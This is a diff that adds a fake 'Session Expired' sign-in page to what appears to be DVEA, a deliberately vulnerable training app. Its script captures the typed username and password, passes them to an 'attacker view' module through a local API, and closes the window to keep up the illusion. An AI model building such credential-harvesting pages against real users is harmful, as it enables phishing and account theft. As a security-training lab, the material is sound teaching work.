@@ -1,0 +1,43 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>DVEA — Sign In</title>
+    <link rel="stylesheet" href="../styles/theme.css" />
+    <link rel="stylesheet" href="../styles/components.css" />
+  </head>
+  <body>
+    <div class="page-wrap">
+      <div class="login-box" role="dialog" aria-labelledby="login-title">
+        <h2 id="login-title">DVEA — Session Expired</h2>
+        <p class="muted">Your session has expired. Please sign in to continue.</p>
+        <form id="login" style="margin-top:1rem;">
+          <label style="display:block; font-size:0.9rem; margin-bottom:0.25rem;">Username or email</label>
+          <input name="username" placeholder="you@example.com" class="login-field" />
+          <label style="display:block; font-size:0.9rem; margin:0.5rem 0 0.25rem 0;">Password</label>
+          <input name="password" type="password" placeholder="Password" class="login-field" />
+          <div style="display:flex; gap:0.5rem; margin-top:1.25rem;">
+            <button type="submit" class="primary btn--primary">Sign In</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      document.getElementById('login').addEventListener('submit', function (e) {
+        e.preventDefault();
+        const data = new FormData(e.target);
+        const obj = {};
+        for (const [k, v] of data.entries()) obj[k] = v;
+        try {
+          // Send captured credentials back to the module page (attacker view) and close window.
+          if (window.api && window.api.sendCapturedCredentials) {
+            window.api.sendCapturedCredentials(obj);
+          }
+        } catch (err) { console.error('sendCapturedCredentials failed', err); }
+        // Close victim-facing window to preserve illusion.
+        window.close();
+      });
+    </script>
+  </body>
+</html>
